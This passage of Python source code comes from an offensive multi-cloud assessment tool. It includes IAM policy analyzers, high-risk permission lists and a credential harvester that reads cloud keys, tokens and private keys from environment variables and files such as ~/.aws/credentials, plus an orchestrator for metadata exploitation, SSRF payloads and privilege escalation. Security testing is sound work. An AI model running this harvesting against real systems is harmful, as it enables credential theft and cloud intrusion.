            "chain_id": uuid.uuid4().hex[:16],
            "steps": chain_steps,
            "depth": len(chain_steps),
            "providers_involved": list(set(s["provider"] for s in chain_steps)),
            "is_cross_provider": len(set(s["provider"] for s in chain_steps)) > 1,
            "total_detection_risk": total_risk,
            "total_impact_score": len(chain_steps) * 10 + (20 if len(set(s["provider"] for s in chain_steps)) > 1 else 0),
        }

    def _deduplicate_chains(
        self, chains: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Remove duplicate chains based on technique sequence."""
        seen: Set[str] = set()
        unique: List[Dict[str, Any]] = []
        for chain in chains:
            key = "|".join(s["technique"] for s in chain["steps"])
            if key not in seen:
                seen.add(key)
                unique.append(chain)
        return unique

    def get_chains(self) -> List[Dict[str, Any]]:
        """Return all synthesized chains."""
        with self._lock:
            return list(self._synthesized_chains)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize chain state."""
        with self._lock:
            return {
                "total_paths": len(self._all_paths),
                "feasible_paths": len([p for p in self._all_paths if p.is_feasible]),
                "synthesized_chains": len(self._synthesized_chains),
                "chains": self._synthesized_chains,
            }


# ════════════════════════════════════════════════════════════════════════════════
# IAM ANALYZER — Cross-Cloud IAM Policy Analysis
# ════════════════════════════════════════════════════════════════════════════════

class IAMAnalyzer:
    """
    Analyzes IAM policies across cloud providers for security weaknesses.

    Detects:
        - Overprivileged roles and users
        - Wildcard permissions (*, *:*)
        - Missing condition constraints
        - Unused permissions
        - Cross-account trust issues
        - Service account key mismanagement

    Usage:
        analyzer = IAMAnalyzer()
        findings = analyzer.analyze_aws_policy(policy_document)
        risk = analyzer.calculate_permission_risk(permissions)
    """

    # High-risk AWS actions
    HIGH_RISK_AWS_ACTIONS = {
        "iam:*", "iam:CreateUser", "iam:CreateRole", "iam:AttachUserPolicy",
        "iam:AttachRolePolicy", "iam:PutUserPolicy", "iam:PutRolePolicy",
        "iam:CreatePolicyVersion", "iam:PassRole", "iam:CreateAccessKey",
        "iam:UpdateAssumeRolePolicy", "iam:AddUserToGroup",
        "sts:AssumeRole", "sts:AssumeRoleWithSAML", "sts:AssumeRoleWithWebIdentity",
        "lambda:CreateFunction", "lambda:InvokeFunction", "lambda:UpdateFunctionCode",
        "ec2:RunInstances", "ec2:DescribeInstances",
        "ssm:SendCommand", "ssm:StartSession",
        "s3:*", "s3:PutBucketPolicy", "s3:GetObject",
        "kms:Decrypt", "kms:CreateGrant",
        "secretsmanager:GetSecretValue",
        "cloudformation:CreateStack",
        "organizations:*",
    }

    # High-risk GCP permissions
    HIGH_RISK_GCP_PERMISSIONS = {
        "iam.serviceAccounts.getAccessToken",
        "iam.serviceAccountKeys.create",
        "iam.serviceAccounts.actAs",
        "iam.serviceAccounts.implicitDelegation",
        "resourcemanager.projects.setIamPolicy",
        "compute.instances.setMetadata",
        "cloudfunctions.functions.create",
        "cloudfunctions.functions.update",
        "deploymentmanager.deployments.create",
        "orgpolicy.policy.set",
        "storage.hmacKeys.create",
        "container.clusterRoles.bind",
        "container.roles.bind",
    }

    # High-risk Azure actions
    HIGH_RISK_AZURE_ACTIONS = {
        "Microsoft.Authorization/roleAssignments/write",
        "Microsoft.Authorization/roleDefinitions/write",
        "Microsoft.Compute/virtualMachines/runCommand/action",
        "Microsoft.KeyVault/vaults/secrets/getSecret/action",
        "Microsoft.Automation/automationAccounts/runbooks/draft/write",
        "Microsoft.Web/sites/publish/action",
        "Microsoft.Storage/storageAccounts/listKeys/action",
        "microsoft.directory/applications/credentials/update",
        "Microsoft.Logic/workflows/write",
    }

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._findings: List[CloudFinding] = []
        self._analyzed_policies: int = 0
        logger.info("IAMAnalyzer initialized")

    def analyze_aws_policy(
        self, policy_document: Dict[str, Any], policy_name: str = ""
    ) -> List[CloudFinding]:
        """Analyze an AWS IAM policy document for security issues."""
        with self._lock:
            findings: List[CloudFinding] = []
            statements = policy_document.get("Statement", [])
            self._analyzed_policies += 1

            for idx, stmt in enumerate(statements):
                effect = stmt.get("Effect", "")
                actions = stmt.get("Action", [])
                resources = stmt.get("Resource", [])
                conditions = stmt.get("Condition", {})

                if isinstance(actions, str):
                    actions = [actions]
                if isinstance(resources, str):
                    resources = [resources]

                if effect != "Allow":
                    continue

                # Check for wildcard actions
                if "*" in actions:
                    finding = CloudFinding(
                        provider=CloudProvider.AWS,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.CRITICAL,
                        title=f"Wildcard Action in Policy: {policy_name}",
                        description=(
                            f"Statement {idx} grants Action: * (all actions). "
                            f"Resource: {', '.join(resources[:3])}"
                        ),
                        technique="IAM Policy Analysis",
                        remediation="Replace wildcard with specific actions following least privilege.",
                        mitre_attack_id="T1098.003",
                    )
                    findings.append(finding)
                    self._findings.append(finding)

                # Check for wildcard resources with sensitive actions
                if "*" in resources:
                    high_risk = [a for a in actions if a in self.HIGH_RISK_AWS_ACTIONS]
                    if high_risk:
                        finding = CloudFinding(
                            provider=CloudProvider.AWS,
                            category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                            severity=Severity.HIGH,
                            title=f"High-Risk Actions on All Resources: {policy_name}",
                            description=(
                                f"High-risk actions {', '.join(high_risk[:5])} "
                                f"granted on Resource: *"
                            ),
                            technique="IAM Policy Analysis",
                            remediation="Scope resources to specific ARNs.",
                        )
                        findings.append(finding)
                        self._findings.append(finding)

                # Check for missing conditions
                if not conditions and any(
                    a in self.HIGH_RISK_AWS_ACTIONS for a in actions
                ):
                    finding = CloudFinding(
                        provider=CloudProvider.AWS,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.MEDIUM,
                        title=f"No Conditions on Sensitive Actions: {policy_name}",
                        description=(
                            f"Statement {idx} grants sensitive actions without conditions. "
                            f"Add IP, MFA, or time-based conditions."
                        ),
                        technique="IAM Policy Analysis",
                        remediation="Add Condition blocks (aws:SourceIp, aws:MultiFactorAuthPresent).",
                    )
                    findings.append(finding)
                    self._findings.append(finding)

            return findings

    def analyze_gcp_bindings(
        self, bindings: List[Dict[str, Any]], resource_name: str = ""
    ) -> List[CloudFinding]:
        """Analyze GCP IAM bindings for security issues."""
        with self._lock:
            findings: List[CloudFinding] = []
            self._analyzed_policies += 1

            for binding in bindings:
                role = binding.get("role", "")
                members = binding.get("members", [])
                condition = binding.get("condition")

                # Check for overly broad roles
                broad_roles = {
                    "roles/owner", "roles/editor",
                    "roles/iam.securityAdmin",
                    "roles/iam.serviceAccountAdmin",
                    "roles/resourcemanager.organizationAdmin",
                }
                if role in broad_roles:
                    finding = CloudFinding(
                        provider=CloudProvider.GCP,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.HIGH,
                        title=f"Broad Role Assigned: {role}",
                        description=(
                            f"Role '{role}' assigned to {len(members)} members on "
                            f"{resource_name or 'resource'}. This grants excessive permissions."
                        ),
                        technique="GCP IAM Analysis",
                        remediation=f"Replace '{role}' with more specific roles.",
                    )
                    findings.append(finding)
                    self._findings.append(finding)

                # Check for allUsers / allAuthenticatedUsers
                public_members = [
                    m for m in members
                    if m in ("allUsers", "allAuthenticatedUsers")
                ]
                if public_members:
                    finding = CloudFinding(
                        provider=CloudProvider.GCP,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.CRITICAL,
                        title=f"Public Access Granted via IAM: {role}",
                        description=(
                            f"Role '{role}' is granted to {', '.join(public_members)} "
                            f"on {resource_name or 'resource'}."
                        ),
                        technique="GCP IAM Analysis",
                        is_exploitable=True,
                        remediation="Remove allUsers/allAuthenticatedUsers bindings.",
                    )
                    findings.append(finding)
                    self._findings.append(finding)

                # Check for missing conditions on sensitive roles
                sensitive_roles = {
                    "roles/owner", "roles/editor",
                    "roles/iam.serviceAccountTokenCreator",
                    "roles/iam.serviceAccountKeyAdmin",
                }
                if role in sensitive_roles and not condition:
                    finding = CloudFinding(
                        provider=CloudProvider.GCP,
                        category=AttackCategory.IAM_PRIVILEGE_ESCALATION,
                        severity=Severity.MEDIUM,
                        title=f"No Condition on Sensitive Role: {role}",
                        description=(
                            f"Sensitive role '{role}' assigned without IAM conditions. "
                            f"Add time-based or attribute-based conditions."
                        ),
                        technique="GCP IAM Analysis",
                        remediation="Add IAM condition to limit role scope.",
                    )
                    findings.append(finding)
                    self._findings.append(finding)

            return findings

    def calculate_permission_risk(
        self, permissions: List[str], provider: CloudProvider = CloudProvider.AWS
    ) -> Dict[str, Any]:
        """Calculate overall risk score for a set of permissions."""
        with self._lock:
            if provider == CloudProvider.AWS:
                high_risk_set = self.HIGH_RISK_AWS_ACTIONS
            elif provider == CloudProvider.GCP:
                high_risk_set = self.HIGH_RISK_GCP_PERMISSIONS
            elif provider == CloudProvider.AZURE:
                high_risk_set = self.HIGH_RISK_AZURE_ACTIONS
            else:
                high_risk_set = set()

            perm_lower = set(p.lower() for p in permissions)
            hr_lower = set(h.lower() for h in high_risk_set)

            matching_high_risk = perm_lower.intersection(hr_lower)
            has_wildcard = "*" in perm_lower or "*:*" in perm_lower
            has_admin = any("admin" in p for p in perm_lower)

            total_perms = len(permissions)
            high_risk_count = len(matching_high_risk)
            risk_ratio = high_risk_count / max(total_perms, 1)

            # Calculate score (0-100)
            score = min(100, int(
                (risk_ratio * 40)
                + (30 if has_wildcard else 0)
                + (20 if has_admin else 0)
                + (min(high_risk_count, 10) * 1)
            ))

            risk_level = "low"
            if score >= 80:
                risk_level = "critical"
            elif score >= 60:
                risk_level = "high"
            elif score >= 40:
                risk_level = "medium"

            return {
                "provider": provider.name,
                "total_permissions": total_perms,
                "high_risk_permissions": list(matching_high_risk),
                "high_risk_count": high_risk_count,
                "has_wildcard": has_wildcard,
                "has_admin": has_admin,
                "risk_score": score,
                "risk_level": risk_level,
            }

    def get_findings(self) -> List[CloudFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize analyzer state."""
        with self._lock:
            return {
                "analyzed_policies": self._analyzed_policies,
                "total_findings": len(self._findings),
                "findings": [f.to_dict() for f in self._findings],
            }


# ════════════════════════════════════════════════════════════════════════════════
# CLOUD CREDENTIAL HARVESTER — Multi-source credential discovery
# ════════════════════════════════════════════════════════════════════════════════

class CloudCredentialHarvester:
    """
    Discovers cloud credentials from multiple sources.

    Sources:
        - Environment variables
        - Configuration files (~/.aws, ~/.gcloud, ~/.azure)
        - Git repositories
        - Process memory / /proc
        - Docker environment
        - Kubernetes secrets and configmaps
        - CI/CD pipeline variables
        - Cloud metadata services

    Usage:
        harvester = CloudCredentialHarvester()
        creds = harvester.harvest_all()
        aws_creds = harvester.harvest_aws()
    """

    # Environment variable patterns for cloud credentials
    ENV_PATTERNS: Dict[CloudProvider, List[str]] = {
        CloudProvider.AWS: [
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
            "AWS_SECURITY_TOKEN", "AWS_DEFAULT_REGION", "AWS_PROFILE",
            "AWS_ROLE_ARN", "AWS_WEB_IDENTITY_TOKEN_FILE",
            "AMAZON_ACCESS_KEY_ID", "AMAZON_SECRET_ACCESS_KEY",
        ],
        CloudProvider.GCP: [
            "GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_CLOUD_PROJECT",
            "GCLOUD_PROJECT", "CLOUDSDK_CORE_PROJECT",
            "GCP_PROJECT", "GCP_SERVICE_ACCOUNT",
            "GOOGLE_CREDENTIALS", "GOOGLE_CLOUD_KEYFILE_JSON",
        ],
        CloudProvider.AZURE: [
            "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
            "AZURE_SUBSCRIPTION_ID", "AZURE_STORAGE_ACCOUNT",
            "AZURE_STORAGE_KEY", "AZURE_STORAGE_CONNECTION_STRING",
            "ARM_CLIENT_ID", "ARM_CLIENT_SECRET", "ARM_TENANT_ID",
            "ARM_SUBSCRIPTION_ID",
        ],
    }

    # Config file locations
    CONFIG_FILES: Dict[CloudProvider, List[str]] = {
        CloudProvider.AWS: [
            "~/.aws/credentials", "~/.aws/config",
            "/root/.aws/credentials", "/root/.aws/config",
            "C:/Users/{user}/.aws/credentials",
        ],
        CloudProvider.GCP: [
            "~/.config/gcloud/application_default_credentials.json",
            "~/.config/gcloud/credentials.db",
            "~/.config/gcloud/properties",
            "/root/.config/gcloud/application_default_credentials.json",
        ],
        CloudProvider.AZURE: [
            "~/.azure/azureProfile.json",
            "~/.azure/accessTokens.json",
            "~/.azure/msal_token_cache.json",
            "/root/.azure/azureProfile.json",
        ],
    }

    # Regex patterns for credential detection in files
    CREDENTIAL_REGEX: Dict[str, str] = {
        "aws_access_key": r"(?:^|[^A-Z0-9])(?:AKIA|ASIA)[A-Z0-9]{16}(?:$|[^A-Z0-9])",
        "aws_secret_key": r"(?:aws_secret_access_key|SECRET_ACCESS_KEY)\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})['\"]?",
        "gcp_service_account_json": r'\{\s*"type"\s*:\s*"service_account"',
        "gcp_private_key": r"-----BEGIN (?:RSA )?PRIVATE KEY-----[^-]+-----END (?:RSA )?PRIVATE KEY-----",
        "azure_client_secret": r"(?:client_secret|AZURE_CLIENT_SECRET)\s*[=:]\s*['\"]?([A-Za-z0-9~._\-]{34,})['\"]?",
        "azure_connection_string": r"DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[A-Za-z0-9/+=]+",
        "generic_api_key": r"(?:api[_-]?key|apikey)\s*[=:]\s*['\"]?([A-Za-z0-9_\-]{20,})['\"]?",
        "generic_token": r"(?:token|bearer)\s*[=:]\s*['\"]?([A-Za-z0-9_\-\.]{20,})['\"]?",
    }

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._credentials: List[CloudCredential] = []
        self._findings: List[CloudFinding] = []
        self._scanned_sources: List[str] = []
        logger.info("CloudCredentialHarvester initialized")

    def harvest_environment(self) -> List[CloudCredential]:
        """Harvest credentials from environment variables."""
        with self._lock:
            creds: List[CloudCredential] = []

            for provider, env_vars in self.ENV_PATTERNS.items():
                found_vars: Dict[str, str] = {}
                for var in env_vars:
                    value = os.environ.get(var, "")
                    if value:
                        found_vars[var] = value

                if found_vars:
                    cred = CloudCredential(
                        credential_id=uuid.uuid4().hex[:16],
                        provider=provider,
                        credential_type=CredentialType.ACCESS_KEY,
                        source="environment_variable",
                        is_valid=True,
                        metadata={"env_vars": list(found_vars.keys())},
                    )

                    # Extract specific fields
                    if provider == CloudProvider.AWS:
                        cred.value = found_vars.get("AWS_ACCESS_KEY_ID", "")
                        cred.secret = found_vars.get("AWS_SECRET_ACCESS_KEY", "")
                        cred.token = found_vars.get("AWS_SESSION_TOKEN", "")
                        cred.region = found_vars.get("AWS_DEFAULT_REGION", "")
                    elif provider == CloudProvider.GCP:
                        cred.value = found_vars.get("GOOGLE_APPLICATION_CREDENTIALS", "")
                        cred.project_id = found_vars.get("GOOGLE_CLOUD_PROJECT", "")
                        cred.credential_type = CredentialType.SERVICE_ACCOUNT_KEY
                    elif provider == CloudProvider.AZURE:
                        cred.value = found_vars.get("AZURE_CLIENT_ID", "")
                        cred.secret = found_vars.get("AZURE_CLIENT_SECRET", "")
                        cred.subscription_id = found_vars.get("AZURE_SUBSCRIPTION_ID", "")
                        cred.metadata["tenant_id"] = found_vars.get("AZURE_TENANT_ID", "")

                    creds.append(cred)
                    self._credentials.append(cred)

                    self._findings.append(CloudFinding(
                        provider=provider,
                        category=AttackCategory.CREDENTIAL_HARVESTING,
                        severity=Severity.HIGH,
                        title=f"{provider.name} Credentials in Environment Variables",
                        description=(
                            f"Found {len(found_vars)} {provider.name} credential "
                            f"environment variables: {', '.join(found_vars.keys())}"
                        ),
                        technique="Environment Variable Harvesting",
                        is_exploitable=True,
                        remediation="Use IAM roles/managed identities instead of env vars.",
                        mitre_attack_id="T1552.001",
                    ))

            self._scanned_sources.append("environment")
            return creds

    def harvest_config_files(self) -> List[CloudCredential]:
        """Harvest credentials from cloud configuration files."""
        with self._lock:
            creds: List[CloudCredential] = []

            for provider, file_paths in self.CONFIG_FILES.items():
                for file_path in file_paths:
                    expanded = os.path.expanduser(file_path)
                    if not os.path.isfile(expanded):
                        continue

                    try:
                        with open(expanded, "r", encoding="utf-8", errors="replace") as f:
                            content = f.read(65536)  # read max 64KB
                    except (OSError, PermissionError):
                        continue

                    if not content:
                        continue

                    # Scan for credential patterns
                    found_creds = self._scan_content_for_credentials(content, provider)
                    for fc in found_creds:
                        fc.source = f"config_file:{expanded}"
                        creds.append(fc)
                        self._credentials.append(fc)

                    if found_creds:
                        self._findings.append(CloudFinding(
                            provider=provider,
                            category=AttackCategory.CREDENTIAL_HARVESTING,
                            severity=Severity.CRITICAL,
                            title=f"{provider.name} Credentials in Config File",
                            description=(
                                f"Found {len(found_creds)} credentials in {expanded}"
                            ),
                            technique="Config File Harvesting",
                            is_exploitable=True,
                            remediation="Secure config files. Use credential helpers.",
                            mitre_attack_id="T1552.001",
                        ))

            self._scanned_sources.append("config_files")
            return creds

    def _scan_content_for_credentials(
        self, content: str, provider: CloudProvider
    ) -> List[CloudCredential]:
        """Scan text content for cloud credentials."""
        creds: List[CloudCredential] = []

        for name, pattern in self.CREDENTIAL_REGEX.items():
            matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
            for match in matches:
                value = match.group(1) if match.lastindex else match.group(0)
                value = value.strip().strip("'\"")

                cred = CloudCredential(
                    credential_id=uuid.uuid4().hex[:16],
                    provider=provider,
                    credential_type=self._classify_credential_type(name),
                    value=value,
                    source="content_scan",
                    metadata={"pattern_name": name},
                )
                creds.append(cred)

        return creds

    def _classify_credential_type(self, pattern_name: str) -> CredentialType:
        """Classify credential type based on pattern name."""
        type_map = {
            "aws_access_key": CredentialType.ACCESS_KEY,
            "aws_secret_key": CredentialType.SECRET_KEY,
            "gcp_service_account_json": CredentialType.SERVICE_ACCOUNT_KEY,
            "gcp_private_key": CredentialType.SSH_KEY,
            "azure_client_secret": CredentialType.API_KEY,
            "azure_connection_string": CredentialType.CONNECTION_STRING,
            "generic_api_key": CredentialType.API_KEY,
            "generic_token": CredentialType.OAUTH_TOKEN,
        }
        return type_map.get(pattern_name, CredentialType.ACCESS_KEY)

    def harvest_all(self) -> List[CloudCredential]:
        """Harvest credentials from all available sources."""
        with self._lock:
            all_creds: List[CloudCredential] = []
            all_creds.extend(self.harvest_environment())
            all_creds.extend(self.harvest_config_files())
            logger.info("Total credentials harvested: %d", len(all_creds))
            return all_creds

    def get_credentials(self) -> List[CloudCredential]:
        """Return all harvested credentials."""
        with self._lock:
            return list(self._credentials)

    def get_findings(self) -> List[CloudFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize harvester state."""
        with self._lock:
            return {
                "credentials_count": len(self._credentials),
                "scanned_sources": self._scanned_sources,
                "findings": [f.to_dict() for f in self._findings],
                "credentials_by_provider": {
                    p.name: len([c for c in self._credentials if c.provider == p])
                    for p in CloudProvider
                    if any(c.provider == p for c in self._credentials)
                },
            }


# ════════════════════════════════════════════════════════════════════════════════
# SIREN CLOUD ATTACKER — Main Orchestrator
# ════════════════════════════════════════════════════════════════════════════════

class SirenCloudAttacker:
    """
    Main orchestrator for multi-cloud offensive operations.

    Coordinates all cloud attack modules to provide a unified
    interface for cloud security assessment.

    Usage:
        attacker = SirenCloudAttacker()

        # Full automated scan
        report = attacker.full_scan(target="company-name")

        # Individual operations
        provider = attacker.detect_cloud_provider()
        meta = attacker.scan_metadata()
        storage = attacker.enumerate_storage("company")
        paths = attacker.find_privesc_paths(permissions)
        secrets = attacker.extract_secrets()
        report = attacker.generate_report()
    """

    def __init__(
        self,
        credential: Optional[CloudCredential] = None,
        region: str = "us-east-1",
        project_id: str = "",
        subscription_id: str = "",
        timeout: float = 5.0,
    ) -> None:
        self._lock = threading.RLock()
        self._credential = credential
        self._region = region
        self._project_id = project_id
        self._subscription_id = subscription_id
        self._timeout = timeout

        # Sub-engines
        self._metadata_exploiter = MetadataExploiter(timeout=timeout)
        self._bucket_scanner = S3BucketScanner(timeout=timeout)
        self._aws_exploiter = AWSExploiter(credential=credential, region=region)
        self._gcp_exploiter = GCPExploiter(
            credential=credential, project_id=project_id, region=region
        )
        self._azure_exploiter = AzureExploiter(
            credential=credential, subscription_id=subscription_id
        )
        self._privesc_chain = CloudPrivEscChain()
        self._iam_analyzer = IAMAnalyzer()
        self._cred_harvester = CloudCredentialHarvester()

        # State
        self._detected_provider: Optional[CloudProvider] = None
        self._all_findings: List[CloudFinding] = []
        self._all_credentials: List[CloudCredential] = []
        self._scan_start_time: float = 0.0
        self._scan_end_time: float = 0.0
        self._scan_phases: List[Dict[str, Any]] = []

        logger.info("SirenCloudAttacker initialized")

    def detect_cloud_provider(self) -> Optional[CloudProvider]:
        """
        Detect which cloud provider the current environment runs on.

        Checks metadata services, environment variables, and platform indicators.
        """
        with self._lock:
            logger.info("Detecting cloud provider...")

            # Check environment variables
            aws_indicators = [
                "AWS_EXECUTION_ENV", "AWS_REGION", "AWS_DEFAULT_REGION",
                "AWS_LAMBDA_FUNCTION_NAME", "ECS_CONTAINER_METADATA_URI",
            ]
            gcp_indicators = [
                "GOOGLE_CLOUD_PROJECT", "GCLOUD_PROJECT", "GCE_METADATA_HOST",
                "FUNCTION_NAME", "K_SERVICE",
            ]
            azure_indicators = [
                "AZURE_FUNCTIONS_ENVIRONMENT", "WEBSITE_SITE_NAME",
                "IDENTITY_ENDPOINT", "MSI_ENDPOINT",
            ]

            for var in aws_indicators:
                if os.environ.get(var):
                    self._detected_provider = CloudProvider.AWS
                    logger.info("Detected AWS via environment variable: %s", var)
                    return CloudProvider.AWS

            for var in gcp_indicators:
                if os.environ.get(var):
                    self._detected_provider = CloudProvider.GCP
                    logger.info("Detected GCP via environment variable: %s", var)
                    return CloudProvider.GCP

            for var in azure_indicators:
                if os.environ.get(var):
                    self._detected_provider = CloudProvider.AZURE
                    logger.info("Detected Azure via environment variable: %s", var)
                    return CloudProvider.AZURE

            # Try metadata services
            endpoints = self._metadata_exploiter.detect_metadata_services()
            if endpoints:
                self._detected_provider = endpoints[0].provider
                logger.info(
                    "Detected %s via metadata service", endpoints[0].provider.name
                )
                return endpoints[0].provider

            logger.info("No cloud provider detected")
            return None

    def scan_metadata(self) -> Dict[str, Any]:
        """
        Scan all cloud metadata services for credentials and information.

        Returns a summary of discovered metadata, credentials, and findings.
        """
        with self._lock:
            phase_start = time.time()
            result: Dict[str, Any] = {
                "endpoints": [],
                "credentials": [],
                "userdata": {},
                "findings": [],
            }

            # Detect metadata services
            endpoints = self._metadata_exploiter.detect_metadata_services()
            result["endpoints"] = [ep.to_dict() for ep in endpoints]

            # Extract credentials
            creds = self._metadata_exploiter.extract_credentials(endpoints)
            for c in creds:
                result["credentials"].append(c.to_dict())
                self._all_credentials.append(c)

            # Extract user-data
            userdata = self._metadata_exploiter.extract_userdata(endpoints)
            result["userdata"] = {k: v[:500] + "..." if len(v) > 500 else v for k, v in userdata.items()}

            # Collect findings
            findings = self._metadata_exploiter.get_findings()
            result["findings"] = [f.to_dict() for f in findings]
            self._all_findings.extend(findings)

            # Generate SSRF payloads
            result["ssrf_payloads"] = self._metadata_exploiter.generate_ssrf_payloads()

            self._scan_phases.append({
                "phase": "metadata_scan",
                "duration": time.time() - phase_start,
                "endpoints_found": len(endpoints),
                "credentials_found": len(creds),
            })

            logger.info(
                "Metadata scan complete: %d endpoints, %d credentials, %d findings",
                len(endpoints), len(creds), len(findings),
            )
            return result

    def enumerate_storage(
        self,
        company_name: str,
        provider: Optional[CloudProvider] = None,
        custom_words: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        """
        Enumerate cloud storage buckets for the target company.

        Scans S3, GCS, and Azure Blob based on detected or specified provider.
        """
        with self._lock:
            phase_start = time.time()
            result: Dict[str, Any] = {
                "provider": (provider or self._detected_provider or CloudProvider.AWS).name,
                "buckets_scanned": 0,
                "public_buckets": [],
                "sensitive_files": [],
                "findings": [],
            }

            target_provider = provider or self._detected_provider or CloudProvider.AWS

            # Scan based on provider
            if target_provider in (CloudProvider.AWS, CloudProvider.UNKNOWN):
                findings = self._bucket_scanner.scan_wordlist(
                    company_name, CloudProvider.AWS, custom_words
                )
                for f in findings:
                    if f.is_public:
                        result["public_buckets"].append(f.to_dict())
                    if f.sensitive_files:
                        result["sensitive_files"].extend(f.sensitive_files[:20])

            if target_provider in (CloudProvider.GCP, CloudProvider.UNKNOWN):
                findings = self._bucket_scanner.scan_wordlist(
                    company_name, CloudProvider.GCP, custom_words
                )
                for f in findings:
                    if f.is_public:
                        result["public_buckets"].append(f.to_dict())
                    if f.sensitive_files:
                        result["sensitive_files"].extend(f.sensitive_files[:20])

            if target_provider == CloudProvider.AZURE:
                azure_findings = self._bucket_scanner.scan_azure_blob(company_name)
                for f in azure_findings:
                    if f.is_public:
                        result["public_buckets"].append(f.to_dict())

            result["buckets_scanned"] = len(self._bucket_scanner._scanned_buckets)
            bucket_findings = self._bucket_scanner.get_findings()
            result["findings"] = [f.to_dict() for f in bucket_findings]

            self._scan_phases.append({
                "phase": "storage_enumeration",
                "duration": time.time() - phase_start,
                "buckets_scanned": result["buckets_scanned"],
                "public_found": len(result["public_buckets"]),
            })

            logger.info(
                "Storage scan complete: %d scanned, %d public, %d sensitive files",
                result["buckets_scanned"],
                len(result["public_buckets"]),
                len(result["sensitive_files"]),
            )
            return result

    def find_privesc_paths(
        self,
        current_permissions: Optional[List[str]] = None,
        provider: Optional[CloudProvider] = None,
    ) -> Dict[str, Any]:
        """
        Find privilege escalation paths for the detected or specified provider.

        Analyzes current permissions against all known privesc techniques
        and synthesizes multi-step attack chains.
        """
        with self._lock:
            phase_start = time.time()
            result: Dict[str, Any] = {
                "aws_paths": [],
                "gcp_paths": [],
                "azure_paths": [],
                "chains": [],
                "total_feasible": 0,
            }

            target = provider or self._detected_provider

            # AWS privesc analysis
            if target in (CloudProvider.AWS, None):
                aws_paths = self._aws_exploiter.find_privesc_paths(current_permissions)
                result["aws_paths"] = [p.to_dict() for p in aws_paths]
                self._privesc_chain.add_paths(aws_paths)
                self._all_findings.extend(self._aws_exploiter.get_findings())

            # GCP privesc analysis
            if target in (CloudProvider.GCP, None):
                gcp_paths = self._gcp_exploiter.find_privesc_paths(current_permissions)
                result["gcp_paths"] = [p.to_dict() for p in gcp_paths]
                self._privesc_chain.add_paths(gcp_paths)
                self._all_findings.extend(self._gcp_exploiter.get_findings())

            # Azure privesc analysis
            if target in (CloudProvider.AZURE, None):
                azure_paths = self._azure_exploiter.find_privesc_paths(current_permissions)
                result["azure_paths"] = [p.to_dict() for p in azure_paths]
                self._privesc_chain.add_paths(azure_paths)
                self._all_findings.extend(self._azure_exploiter.get_findings())

            # Synthesize chains
            chains = self._privesc_chain.synthesize_chains()
            result["chains"] = chains

            result["total_feasible"] = (
                len(result["aws_paths"])
                + len(result["gcp_paths"])
                + len(result["azure_paths"])
            )

            self._scan_phases.append({
                "phase": "privesc_analysis",
                "duration": time.time() - phase_start,
                "feasible_paths": result["total_feasible"],
                "chains": len(chains),
            })

            logger.info(
                "PrivEsc analysis complete: %d feasible paths, %d chains",
                result["total_feasible"], len(chains),
            )
            return result

    def extract_secrets(self) -> Dict[str, Any]:
        """
        Extract secrets from all available sources.

        Harvests credentials from env vars, config files, metadata,
        Lambda/Cloud Functions, EC2 user-data, and Key Vault.
        """
        with self._lock:
            phase_start = time.time()
            result: Dict[str, Any] = {
                "environment_creds": [],
                "config_file_creds": [],
                "lambda_secrets": {},
                "function_secrets": {},
                "userdata_secrets": {},
                "keyvault_secrets": {},
                "total_secrets": 0,
            }

            # Harvest from environment and config files
            env_creds = self._cred_harvester.harvest_environment()
            result["environment_creds"] = [c.to_dict() for c in env_creds]
            self._all_credentials.extend(env_creds)

            config_creds = self._cred_harvester.harvest_config_files()
            result["config_file_creds"] = [c.to_dict() for c in config_creds]
            self._all_credentials.extend(config_creds)

            self._all_findings.extend(self._cred_harvester.get_findings())

            result["total_secrets"] = (
                len(env_creds)
                + len(config_creds)
            )

            self._scan_phases.append({
                "phase": "secret_extraction",
                "duration": time.time() - phase_start,
                "total_secrets": result["total_secrets"],
            })

            logger.info("Secret extraction complete: %d total secrets", result["total_secrets"])
            return result

    def generate_report(self) -> Dict[str, Any]:
        """
        Generate a comprehensive cloud security assessment report.

        Aggregates all findings, credentials, and attack paths into
        a structured report with severity breakdown and recommendations.
        """
        with self._lock:
            # Deduplicate findings
            seen_ids: Set[str] = set()
            unique_findings: List[CloudFinding] = []
            for f in self._all_findings:
                if f.finding_id not in seen_ids:
                    seen_ids.add(f.finding_id)
                    unique_findings.append(f)

            # Severity breakdown
            severity_counts: Dict[str, int] = defaultdict(int)
            for f in unique_findings:
                severity_counts[f.severity.name] += 1

            # Category breakdown
            category_counts: Dict[str, int] = defaultdict(int)
            for f in unique_findings:
                category_counts[f.category.name] += 1

            # Provider breakdown
            provider_counts: Dict[str, int] = defaultdict(int)
            for f in unique_findings:
                provider_counts[f.provider.name] += 1

            # Exploitable findings
            exploitable = [f for f in unique_findings if f.is_exploitable]

            # Overall risk score
            risk_weights = {
                Severity.CRITICAL: 10,
                Severity.HIGH: 7,
                Severity.MEDIUM: 4,
                Severity.LOW: 1,
                Severity.INFO: 0,
            }
            total_risk = sum(risk_weights.get(f.severity, 0) for f in unique_findings)
            max_possible = len(unique_findings) * 10 if unique_findings else 1
            risk_percentage = min(100, int((total_risk / max_possible) * 100))

            risk_rating = "LOW"
            if risk_percentage >= 80:
                risk_rating = "CRITICAL"
            elif risk_percentage >= 60:
                risk_rating = "HIGH"
